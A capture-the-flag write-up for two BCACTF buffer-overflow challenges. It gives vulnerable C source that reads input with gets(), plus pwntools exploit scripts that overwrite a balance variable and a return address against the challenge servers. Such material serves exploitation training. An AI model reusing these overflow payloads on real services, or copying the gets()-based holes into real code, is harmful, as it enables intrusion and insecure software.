# BOF Shop

Buffer overflow on the name variable overflows unto the balance variable.
'd' character becomes 100 in ascii

C code provided
```c
#include <stdio.h>
#include <stdlib.h>

#define FLAG_BUFFER 100
int main() {
  char flag[FLAG_BUFFER];
  FILE *fp = NULL;
  char name[16];
  int balance = 0;
  
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts("Hello there, welcome to the BOF Shop!");
  puts("What's your name?");
  printf("> ");
  gets(name);

  printf("Your balance: %d coins\n\n", balance);

  if (balance != 100) {
      puts("Sorry, but you need exactly 100 coins to purchase the flag.\nGoodbye.");
      exit(1);
  }

  fp = fopen("flag.txt", "r");
  if (fp == NULL) {
      puts("Please add flag.txt to the present working directory to test this file.\n");
      puts("If you see this on the remote server, please contact admin.");
      exit(1);
  }

  fgets(flag, FLAG_BUFFER, fp);
  puts("Wow. Here, take the flag in exchange for your 100 coins.");
  puts(flag);
}
```
Solution

```python
from pwn import *

conn = remote('bin.bcactf.com', 49174)
conn.recvuntil('name?'.encode())

payload = 'A' * 116 + 'd'
conn.sendline(payload.encode())

conn.interactive()
```

# Jump Rope

Jumping functions by poisoning the return register.
Buffer overflow into the return register, found by testing with core files and gdb anaylsis
Found that at after 520 chars, we reach the return register. 
Then to find the address of the a() function, we use objdump -t.

Source Code provided
```c
#include <stdio.h>
#include <stdlib.h>

void a() {
    FILE *fptr = fopen("flag.txt", "r");
    char flag[100];
    if(fptr == NULL){
        printf("\nLooks like we've run out of jump ropes...\n");
        printf("Challenge is misconfigured. Please contact admin if you see this.\n");
    }

    fgets(flag, sizeof(flag), fptr);
    puts(flag);
}

void jumprope(){
    char arr[500];
    printf("\nBetter start jumping!\n");
    gets(arr);
    printf("Woo, that was quite the workout wasn't it!\n");
}

int main() {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);

    printf("Here at BCA, fitness is one of our biggest priorities!\n");
    printf("Today's workout is going to be jumproping. Enjoy!\n");
    jumprope();

    return 1;
}
```

Solution

```python
from pwn import *

conn = remote('bin.bcactf.com', 49177)

conn.recvuntil('jumping!'.encode())

payload = 'A' * 520 + '\xb6\x11\x40'

conn.sendline(payload.encode('iso-8859-1'))

conn.interactive()
```